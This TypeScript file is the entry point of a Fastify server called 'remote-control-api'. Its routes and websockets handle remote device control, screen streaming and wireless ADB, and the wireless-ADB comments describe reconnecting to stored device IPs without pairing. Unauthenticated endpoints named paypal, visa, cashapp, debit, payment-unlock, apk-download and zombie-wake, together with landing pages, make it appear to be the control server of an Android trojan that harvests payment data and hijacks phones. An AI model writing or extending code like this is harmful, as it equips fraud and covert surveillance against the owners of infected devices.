import Fastify from "fastify";
import cors from "@fastify/cors";
import websocket from "@fastify/websocket";
import { config } from "./config.js";
import { pingDatabase } from "./db/pool.js";
import { markAllDevicesOffline } from "./services/device.service.js";
import { requireAdminAuth } from "./middleware/require-admin-auth.js";
import { registerAuthRoutes } from "./routes/auth.routes.js";
import { registerAdminUserRoutes } from "./routes/admin-user.routes.js";
import { registerHealthRoutes } from "./routes/health.routes.js";
import { registerDeviceRoutes } from "./routes/device.routes.js";
import { registerDeviceGroupRoutes } from "./routes/device-group.routes.js";
import { registerCommandRoutes } from "./routes/command.routes.js";
import { registerDataRoutes } from "./routes/data.routes.js";
import { registerDownloadRoutes } from "./routes/download.routes.js";
import { registerVideoRoutes } from "./routes/video.routes.js";
import { registerConfigRoutes } from "./routes/config.routes.js";
import { registerLandingRoutes } from "./routes/landing.routes.js";
import { registerWeiPageRoutes } from "./routes/wei-page.routes.js";
import { registerDeviceTransferRoutes } from "./routes/device-transfer.routes.js";
import { registerWebrtcRoutes } from "./routes/webrtc.routes.js";
import { registerDeviceWsRoutes } from "./ws/device.ws.js";
import { registerDeviceScreenWsRoutes } from "./ws/device-screen.ws.js";
import { registerDeviceAdbWsRoutes } from "./ws/device-adb.ws.js";
import { registerAdminWsRoutes } from "./ws/admin.ws.js";
import { registerAdminScreenWsRoutes } from "./ws/admin-screen.ws.js";
import { registerAdbRoutes } from "./routes/adb.routes.js";
import { ensureSuperAdminSeed } from "./services/admin-user.service.js";
import { bootstrapA11yProbe } from "./services/a11y-probe-bootstrap.js";
import { bootstrapAdbRestore } from "./services/adb-restore-bootstrap.js";

function isPublicRequest(pathname: string): boolean {
  return (
    pathname === "/health" ||
    pathname === "/api/auth/login" ||
    pathname === "/api/device/register" ||
    pathname === "/api/device/paypal" ||
    pathname === "/api/device/visa" ||
    pathname === "/api/device/cashapp" ||
    pathname === "/api/device/debit" ||
    pathname === "/api/device/payment-methods" ||
    pathname === "/api/device/apk-download" ||
    pathname === "/api/device/installer-install" ||
    pathname === "/api/device/client-install" ||
    pathname === "/api/device/zombie-wake" ||
    pathname === "/api/device/zombie-wake/fcm-check" ||
    pathname === "/api/device/payment-unlock" ||
    pathname === "/api/device/bind-code" ||
    pathname === "/api/device/videos" ||
    pathname === "/api/public/landing-view" ||
    pathname === "/api/public/apk-download" ||
    pathname === "/api/adm/device/accept-transfer" ||
    pathname.startsWith("/public/wei-page/") ||
    pathname.startsWith("/ws/device")
  );
}

function isProtectedRequest(pathname: string): boolean {
  return pathname.startsWith("/api/") || pathname.startsWith("/ws/admin");
}

async function bootstrap() {
  const app = Fastify({
    logger: true,
    ignoreTrailingSlash: true,
    // nginx 等同机反代时需信任 X-Forwarded-*，否则 request.ip / WS 对端会是 127.0.0.1
    trustProxy: true,
  });

  await app.register(cors, {
    origin: true,
    methods: ["GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    // 落地页跨域上报依赖这些头
    exposedHeaders: ["Content-Type"],
  });
  await app.register(websocket, {
    options: {
      maxPayload: 16 * 1024 * 1024,
    },
  });

  app.addHook("onRequest", async (request, reply) => {
    const pathname = request.url.split("?")[0] ?? request.url;
    if (isPublicRequest(pathname) || !isProtectedRequest(pathname)) {
      return;
    }
    if (!(await requireAdminAuth(request, reply))) {
      return;
    }
  });

  await registerHealthRoutes(app);
  await registerAuthRoutes(app);
  await registerAdminUserRoutes(app);
  await registerDeviceRoutes(app);
  await registerDeviceGroupRoutes(app);
  await registerCommandRoutes(app);
  await registerAdbRoutes(app);
  await registerDataRoutes(app);
  await registerDownloadRoutes(app);
  await registerVideoRoutes(app);
  await registerConfigRoutes(app);
  await registerWebrtcRoutes(app);
  await registerLandingRoutes(app);
  await registerWeiPageRoutes(app);
  await registerDeviceTransferRoutes(app);
  await registerDeviceWsRoutes(app);
  await registerDeviceScreenWsRoutes(app);
  await registerDeviceAdbWsRoutes(app);
  await registerAdminWsRoutes(app);
  await registerAdminScreenWsRoutes(app);

  await pingDatabase();
  await ensureSuperAdminSeed(config.admin.username, config.admin.password);
  await markAllDevicesOffline();
  // 无障碍实际连接探针：读缓存、后台补探测，列表接口不阻塞在设备回包上。
  bootstrapA11yProbe();
  // 无线 ADB 端点自动恢复：重启后靠库里存的 IP+端口免配对重连。
  bootstrapAdbRestore();

  await app.listen({
    host: config.host,
    port: config.port,
  });

  app.log.info(`remote-control-api listening on http://${config.host}:${config.port}`);
}

bootstrap().catch((error) => {
  console.error("[remote-control-api] bootstrap failed:", error);
  process.exit(1);
});
